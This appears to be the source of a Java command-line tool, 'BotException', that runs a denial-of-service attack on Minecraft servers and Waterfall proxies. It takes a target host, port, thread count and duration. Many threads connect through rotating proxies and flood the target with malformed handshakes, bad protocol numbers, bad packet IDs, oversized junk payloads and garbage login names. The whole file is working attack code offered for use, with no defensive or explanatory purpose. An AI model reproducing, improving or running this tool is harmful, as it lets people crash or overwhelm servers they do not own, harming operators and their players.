package me.nzxter.botexception;

import java.awt.Color;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.SocketImpl;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.TimerTask;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import me.nzxter.botexception.BotException;

public class BotException {
	private static final ProxyManager proxyManager = new ProxyManager();

	private static Random random = new Random();

	public static int threads = 0;
	public static int number = 0;
	
	public static void pingBytes(int n) {
		number = n;
	}

	public static void main(String[] args) {
		if (args.length == 4) {
			try {
				BotException.pingThreadCrasher(args[0], Integer.valueOf(args[1]), Integer.valueOf(args[2]),
						Integer.valueOf(args[3]));
			} catch (NumberFormatException | InterruptedException e) {
			}
		} else {
			System.out.println("By NzxterMC / MHF_TikTok / M.F");
			System.out.println();
			System.out.println("java -jar botexception.jar <host> <port> <threads> <time>");
			System.out.println();
			System.out.println("Working for Proxys and Server");
		}
	}

	public static void pingThreadCrasher(String host, int port, int maxThreads, long time) throws InterruptedException {
		
		System.out.println();
		System.out.println("-------------------------");
		System.out.println("Starting attack");
		System.out.println();
		System.out.println("Host: " + host);
		System.out.println("Port: " + port);
		System.out.println("Threads: " + maxThreads);
		System.out.println("Time: " + time);
		System.out.println("-------------------------");
		System.out.println();

		Thread.sleep(3000);

		time = TimeUnit.SECONDS.toMillis(time);
		long time1 = System.currentTimeMillis();

		do {
			if (threads < maxThreads) {
				new Thread() {

					@Override
					public void run() {
						++threads;
						try {
							BotException.pingBytes(number + 1);
							
							BotException.botjoiner(host, port);

							System.out.println("New #" + number);
						} catch (Exception exception) {
						}
						try {
							BotException.pingBytes(number + 1);
							
							BotException.waterfallbadpacketid(host, port);

							System.out.println("New #" + number);
						} catch (Exception exception) {
						}
						try {
							BotException.pingBytes(number + 1);
							
							BotException.waterfallbadprotocol(host, port);

							System.out.println("New #" + number);
						} catch (Exception exception) {
						}
						try {
							BotException.pingBytes(number + 1);
							
							BotException.waterfallpinged(host, port);

							System.out.println("New #" + number);
						} catch (Exception exception) {
						}
						try {
							BotException.pingBytes(number + 1);
							
							BotException.waterfallquietexceptionloginpackets(host, port);

							System.out.println("New #" + number);
						} catch (Exception exception) {
						}
						--threads;
					}
				}.start();
			}
		} while ((System.currentTimeMillis() - time1) < time);

		System.out.println();
		System.out.println("Starting attack stopped");
		System.out.println();

		System.exit(0);
	}

	
	public static void botjoiner(String host, int port)
			throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException,
			NoSuchMethodException, InvocationTargetException, IOException, InterruptedException {
			
			Proxy proxy = proxyManager.nextProxy();

			Socket socket = new Socket(proxy);
		
			System.out.println("Proxy: " + proxy.address());

			socket.connect(new InetSocketAddress(host, port));
			
	        Thread.sleep(1000L);
			
			DataOutputStream out = new DataOutputStream(socket.getOutputStream());
			
			PacketUtils.sendPacket(PacketUtils.createHandshakeMessage18(host, port, 2), out);

			if (random.nextBoolean()) {
				PacketUtils.sendPacket(PacketUtils.createLogin("" + random.nextInt(-1)), out);

			} else {

				if (random.nextBoolean()) {
					PacketUtils.sendPacket(PacketUtils.createLogin(" "), out);

				} else {

					if (random.nextBoolean()) {
						PacketUtils.sendPacket(PacketUtils.createLogin("abcdefghijklmnopqrstuvwxyz123456789"), out);

					} else {

						if (random.nextBoolean()) {
							PacketUtils.sendPacket(PacketUtils.createLogin(
									"Ã˜Â¨Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™Å½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™â€˜Ã™â€˜Ã™â€˜Ã™â€™Ã˜Â±Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™Å½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™â€˜Ã™â€˜Ã™â€˜Ã™â€™Ã˜Â¢Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™ï¿½Ã™â€˜ Ã°Å¸â€¡Â®Ã°Å¸â€¡Â¹Ã˜Â¨Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™Å½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™â€˜Ã™â€˜Ã™â€˜Ã™â€™Ã˜Â±Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™Å½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™â€˜Ã™â€˜Ã™â€˜Ã™â€™Ã˜Â¢Ã™ï¿½Ã™ï¿½Ã™ï¿½Ã™Å½Ã™ï¿½Ã™â€˜Ã°Å¸â€¡Â®Ã°Å¸â€¡Â¹"),
									out);
						}
					}
				}
				socket.close();
			}
		}
	

	public static void waterfallpinged(final String host, final int port) throws IOException, InterruptedException {
		
		Proxy proxy = proxyManager.nextProxy();

		Socket socket = new Socket(proxy);
	
		System.out.println("Proxy: " + proxy.address());

		socket.connect(new InetSocketAddress(host, port));
		
        Thread.sleep(1000L);
		
		DataOutputStream out = new DataOutputStream(socket.getOutputStream());
		
	    byte[] handshakeMessage = PacketUtils.createHandshakeMessage18(host, port, 1);
	    PacketUtils.writeVarInt(out, handshakeMessage.length);
	    out.write(handshakeMessage);
	    for (int i = 0; i < 1500; ++i) {
	        out.writeUTF(String.valueOf(""));
	    }
	    System.out.println("Bytes: " + out.size());
		socket.close();
	}
	
	public static void waterfallquietexceptionloginpackets(final String host, final int port) throws IOException, InterruptedException {
		
		Proxy proxy = proxyManager.nextProxy();

		Socket socket = new Socket(proxy);
	
		System.out.println("Proxy: " + proxy.address());

		socket.connect(new InetSocketAddress(host, port));
		
        Thread.sleep(1000L);
		
		DataOutputStream out = new DataOutputStream(socket.getOutputStream());
	    byte[] handshakeMessage = PacketUtils.createHandshakeMessage18(host, port, 1);
	    PacketUtils.writeVarInt(out, handshakeMessage.length);
	    out.write(handshakeMessage);
	    for (int i = 0; i < 1500; ++i) {
	        out.writeUTF(String.valueOf("#"));
	    }
	    System.out.println("Bytes: " + out.size());
		socket.close();
	}
	
	public static void waterfallbadprotocol(final String host, final int port) throws IOException, InterruptedException {
		
		Proxy proxy = proxyManager.nextProxy();

		Socket socket = new Socket(proxy);
	
		System.out.println("Proxy: " + proxy.address());

		socket.connect(new InetSocketAddress(host, port));
		
        Thread.sleep(1000L);
		
		DataOutputStream out = new DataOutputStream(socket.getOutputStream());
	    byte[] handshakeMessage = PacketUtils.createHandshakeMessage18(host, port, 99);
	    PacketUtils.writeVarInt(out, handshakeMessage.length);
	    out.write(handshakeMessage);
	    System.out.println("Bytes: " + out.size());
		socket.close();
	}
	
	public static void waterfallbadpacketid(final String host, final int port) throws IOException, InterruptedException {
		
		Proxy proxy = proxyManager.nextProxy();

		Socket socket = new Socket(proxy);
	
		System.out.println("Proxy: " + proxy.address());

		socket.connect(new InetSocketAddress(host, port));
		
        Thread.sleep(1000L);
		
		DataOutputStream out = new DataOutputStream(socket.getOutputStream());
	    byte[] handshakeMessage = PacketUtils.createHandshakeMessageMods(host, port, 2);
	    PacketUtils.writeVarInt(out, handshakeMessage.length);
	    out.write(handshakeMessage);
	    System.out.println("Bytes: " + out.size());
		socket.close();
	}
}

